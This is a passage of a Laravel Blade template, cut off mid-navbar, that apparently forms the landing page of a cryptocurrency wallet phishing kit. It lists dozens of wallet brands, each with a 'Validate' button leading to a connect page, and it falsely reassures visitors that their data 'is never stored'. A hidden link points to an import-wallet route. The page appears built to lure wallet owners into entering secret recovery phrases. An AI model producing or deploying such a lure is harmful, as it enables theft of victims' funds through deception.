@extends('layouts.app')

@section('content')

    <div class="container">
        <h1 class="text-center p-3" style="font-size: 4em">
            <img src="img/cidip.jpg" alt="" style="width: 45px; height: 45px;">
            Blockchain
        </h1>

        <div class="card shadow-sm mb-5 curve" style="border: 0;">

            <div class="card-body bg-light">
                <h2 class="mb-4 text-center text-info">
                    SELECT WALLET TYPE
                </h2>

                <p class="font-weight-bold text-center">
                    Choose your wallet and proceed to validate securely.
                </p>

                <p class="text-center">
                    After validation, select Correct Node String.
                </p>

                <p class="text-center">
                    Your data stays on your device and its never stored.
                </p>
            </div>
        </div>

        <div class="row py-3">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=metamask">
                                <img src="img/metamask.png" alt="MetaMask">
                            </a>
                        </p>

                        <h4 class="font-weight-bold mb-4">MetaMask</h4>
                        <p>
                            <a  href="connect?type=metamask" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=trustwallet">
                                <img src="img/trustwallet.png" alt="Trust wallet">
                            </a>
                        </p>

                        <h4 class="font-weight-bold mb-4">Trust wallet</h4>
                        <p>
                            <a href="connect?type=trustwallet" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=ledger">
                                <img src="img/ledger.png" alt="Trust wallet">
                            </a>
                        </p>
                        <h4 class="font-weight-bold mb-4">Ledger</h4>
                        <p>
                            <a href="connect?type=ledger" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=safepal">
                                <img src="img/safepal.png" alt="Trust wallet">
                            </a>
                        </p>

                        <h4 class="font-weight-bold mb-4">Safepal</h4>

                        <p>
                            <a href="connect?type=safepal" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=ada">
                                <img src="img/ada.png" alt="Ada">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Ada</h3>

                        <p>
                            <a href="connect?type=ada" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=yor">
                                <img src="img/yor.jpg" alt="Yor">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Yor</h3>

                        <p>
                            <a href="connect?type=yor" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=cosmostation">
                                <img src="img/cos.png" alt="Cosmostation">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Cosmostation</h3>

                        <p>
                            <a href="connect?type=cosmostation" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=phantom">
                                <img src="img/phantom.webp" alt="Phamtom">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Phantom</h3>

                        <p>
                            <a href="connect?type=phantom" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=trezor">
                                <img src="img/trezor.jpg" alt="Trezor">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Trezor</h3>

                        <p>
                            <a href="connect?type=trezor" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=trezor">
                                <img src="img/theta.png" alt="Theta">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Theta Wallet</h3>

                        <p>
                            <a href="connect?type=theta" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=imtoken">
                                <img src="img/imtoken.jpg" alt="imtoken">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Imtoken</h3>

                        <p>
                            <a href="connect?type=imtoken" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=terra">
                                <img src="img/terra.png" alt="terra">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Terra Station</h3>

                        <p>
                            <a href="connect?type=terra" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=zillaqa">
                                <img src="img/zilla.png" alt="ZillaQA">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">ZillaQA</h3>

                        <p>
                            <a href="connect?type=zillaqa" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=tronlink">
                                <img src="img/tron.png" alt="tronlink">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Tron Link</h3>

                        <p>
                            <a href="connect?type=tronlink" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=moonlet">
                                <img src="img/moonlet.jpg" alt="moonlet">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Moonlet</h3>

                        <p>
                            <a href="connect?type=moonlet" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=fantom">
                                <img src="img/fantom.png" alt="Fantom">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Fantom</h3>

                        <p>
                            <a href="connect?type=fantom" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=avax">
                                <img src="img/avax.png" alt="avax">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Avax Wallet</h3>

                        <p>
                            <a href="connect?type=avax" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=bitkeep">
                                <img src="img/bitkeep.png" alt="Bitkeep">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Bitkeep</h3>

                        <p>
                            <a href="connect?type=bitkeep" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=guarda">
                                <img src="img/guarda.jpg" alt="guarda">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Guarda</h3>

                        <p>
                            <a href="connect?type=guarda" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=tokenpocket">
                                <img src="img/tokenocket.webp" alt="tokenpocket">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Token Pocket</h3>

                        <p>
                            <a href="connect?type=tokenpocket" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=harmony">
                                <img src="img/harmony.png" alt="harmony">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Harmony</h3>

                        <p>
                            <a href="connect?type=harmony" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=tezos">
                                <img src="img/tezos.png" alt="tezos">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Tezos</h3>

                        <p>
                            <a href="connect?type=tezos" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=coinbase">
                                <img src="img/coinbase.png" alt="coinbase">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Coinbase</h3>

                        <p>
                            <a href="connect?type=coinbase" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=mew">
                                <img src="img/mew.png" alt="mew">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Mew Wallet</h3>

                        <p>
                            <a href="connect?type=mew" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=crypto">
                                <img src="img/crypto.jpg" alt="crypto">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Crypto.com</h3>

                        <p>
                            <a href="connect?type=crypto" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=1inch">
                                <img src="img/1inch.png" alt="1inch">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">1Inch Wallet</h3>

                        <p>
                            <a href="connect?type=1inch" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=coinmoni">
                                <img src="img/coinmoni.png" alt="coinmoni">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">CoinMoni</h3>

                        <p>
                            <a href="connect?type=coinmoni" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=exodus">
                                <img src="img/exodus.jpg" alt="exodus">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Exodus</h3>

                        <p>
                            <a href="connect?type=exodus" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=argent">
                                <img src="img/arg.png" alt="argent">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Argent</h3>

                        <p>
                            <a href="connect?type=argent" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=rainbow">
                                <img src="img/rainbow.webp" alt="rainbow">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Rainbow</h3>

                        <p>
                            <a href="connect?type=rainbow" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=ledger live">
                                <img src="img/live.png" alt="ledger live">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Ledger Live</h3>

                        <p>
                            <a href="connect?type=ledger live" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=gnosis">
                                <img src="img/gnosis.png" alt="Gnosis">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Gnosis</h3>

                        <p>
                            <a href="connect?type=gnosis" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=wallet connect">
                                <img src="img/logo.svg" alt="wallet connect">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Wallet Connect</h3>

                        <p>
                            <a href="connect?type=wallet connect" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=huobi">
                                <img src="img/huobi.png" alt="huobi">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Huobi</h3>

                        <p>
                            <a href="connect?type=huobi" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=binance">
                                <img src="img/binance.png" alt="Binance">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Binance</h3>

                        <p>
                            <a href="connect?type=binance" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=multisig">
                                <img src="img/multi.jpg" alt="multisig">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Gnosis Safe Multisig</h3>

                        <p>
                            <a href="connect?type=multisig" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=pillar">
                                <img src="img/pillar.jpg" alt="pillar">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Pillar</h3>

                        <p>
                            <a href="connect?type=pillar" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=onto">
                                <img src="img/onto.jpg" alt="onto">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Onto</h3>

                        <p>
                            <a href="connect?type=onto" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=velas">
                                <img src="img/velas.jpg" alt="velas">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Velas</h3>

                        <p>
                            <a href="connect?type=velas" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=pvu">
                                <img src="img/pvu.png" alt="PVU">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">PVU</h3>

                        <p>
                            <a href="connect?type=pvu" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=vechain">
                                <img src="img/vechain.jpg" alt="vechain">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Vechain</h3>

                        <p>
                            <a href="connect?type=vechain" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=safemoon">
                                <img src="img/safemoon.jpg" alt="safemoon">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Safemoon</h3>

                        <p>
                            <a href="connect?type=safemoon" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=math wallet">
                                <img src="img/math.jpg" alt="math">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Math Wallet</h3>

                        <p>
                            <a href="connect?type=math" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=bitpay">
                                <img src="img/bitpay.jpg" alt="bitpay">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Bitpay</h3>

                        <p>
                            <a href="connect?type=bitpay" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=walleth">
                                <img src="img/walleth.jpg" alt="walleth">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Walleth</h3>

                        <p>
                            <a href="connect?type=walleth" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=authereum">
                                <img src="img/authereum.png" alt="authereum">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Authereum</h3>

                        <p>
                            <a href="connect?type=authereum" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=coin98">
                                <img src="img/coin98.png" alt="coin98">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Coin98</h3>

                        <p>
                            <a href="connect?type=coin98" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=alice">
                                <img src="img/alice.jpg" alt="alice">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Alice</h3>

                        <p>
                            <a href="connect?type=alice" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=tokenary">
                                <img src="img/tokenary.jpg" alt="tokenary">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Tokenary</h3>

                        <p>
                            <a href="connect?type=tokenary" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=cybavo">
                                <img src="img/cybavo.jpg" alt="cybavo">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Cybavo</h3>

                        <p>
                            <a href="connect?type=cybavo" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=infiniti">
                                <img src="img/infiniti.jpg" alt="infiniti">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Infiniti</h3>

                        <p>
                            <a href="connect?type=infiniti" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=wallet">
                                <img src="img/wallet.jpg" alt="wallet">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Wallet.io</h3>

                        <p>
                            <a href="connect?type=wallet" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=infinity">
                                <img src="img/infinity.jpg" alt="infinity">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Infinity Wallet</h3>

                        <p>
                            <a href="connect?type=infinity" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=spatium">
                                <img src="img/spatium.jpg" alt="spatium">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Spatium</h3>

                        <p>
                            <a href="connect?type=spatium" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=gridplus">
                                <img src="img/gridplus.jpg" alt="gridplus">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">GridPlus</h3>

                        <p>
                            <a href="connect?type=gridplus" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=torus">
                                <img src="img/torus.jpg" alt="torus">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Torus</h3>

                        <p>
                            <a href="connect?type=torus" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=zelcore">
                                <img src="img/zelcore.png" alt="zelcore">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Zelcore</h3>

                        <p>
                            <a href="connect?type=zelcore" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=dcent">
                                <img src="img/decent.jpg" alt="dcent">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">D'cent Wallet</h3>

                        <p>
                            <a href="connect?type=dcent" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=alpha">
                                <img src="img/alpha.jpg" alt="alpha">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Alpha Wallet</h3>

                        <p>
                            <a href="connect?type=alpha" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=cool">
                                <img src="img/cool.jpg" alt="cool">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Cool Wallet</h3>

                        <p>
                            <a href="connect?type=cool" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=atomic">
                                <img src="img/atomic.png" alt="atomic">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Atomic Wallet</h3>

                        <p>
                            <a href="connect?type=atomic" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=dydx">
                                <img src="img/dydx.jpg" alt="dydx">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">DyDx</h3>

                        <p>
                            <a href="connect?type=dydx" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=curve">
                                <img src="img/curve.jpg" alt="curve">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Curve</h3>

                        <p>
                            <a href="connect?type=curve" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=nash">
                                <img src="img/nash.jpg" alt="nash">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Nash</h3>

                        <p>
                            <a href="connect?type=nash" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=yearn">
                                <img src="img/yearn.jpg" alt="yearn">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Yearn</h3>

                        <p>
                            <a href="connect?type=yearn" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=binance dex">
                                <img src="img/dex.jpg" alt="binance dex">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Binance Dex</h3>

                        <p>
                            <a href="connect?type=binance dex" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=vault">
                                <img src="img/vault.jpg" alt="vault">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Vault</h3>

                        <p>
                            <a href="connect?type=vault" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=loopring">
                                <img src="img/loop.jpg" alt="Loop Ring">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">Loopring</h3>

                        <p>
                            <a href="connect?type=loopring" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Row -->
        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card curve">
                    <div class="card-body text-center">
                        <p class="mb-4">
                            <a href="connect?type=mycrypto">
                                <img src="img/mycryto.jpg" alt="mycrypto">
                            </a>
                        </p>

                        <h3 class="font-weight-bold mb-4">My Crypto</h3>

                        <p>
                            <a href="connect?type=mycryto" class="btn btn-danger px-5">Validate</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>

	<nav class="navbar navbar-expand navbar-light bg-white d-none">
    	<div class="container">
	        <a class="navbar-brand" href="{{ url('/') }}">
	            <img src="/img/logo.svg" style="width: 100px;">
	        </a>

	    	<!-- Right Side Of Navbar -->
	        <ul class="navbar-nav ml-auto">

	            <li class="nav-item">
	                <a class="nav-link font-weight-bold" href="#">Wallets</a>
	            </li>

	            <li class="nav-item">
	                <a class="nav-link font-weight-bold" href="/import-wallet">Apps</a>
	            </li>
